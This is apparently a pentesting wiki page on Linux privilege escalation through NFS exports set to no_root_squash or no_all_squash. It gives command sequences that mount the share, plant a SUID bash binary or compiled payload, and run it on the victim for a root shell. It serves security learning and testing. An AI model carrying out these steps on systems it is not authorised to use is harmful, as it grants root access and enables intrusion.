# NFS no\_root\_squash/no\_all\_squash misconfiguration PE

Read the _**/etc/exports**_ file, if you find some directory that is configured as **no\_root\_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.

**no\_root\_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.

**no\_all\_squash:** This is similar to **no\_root\_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no\_all\_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user \(by mounting using nfs\). Execute the suid as nobody user and become different user.

## Privilege Escalation

If you have found this vulnerability, you can exploit it:

* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary \(you can find here some[ C SUID payloads](payloads-to-execute.md#c)\).

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```



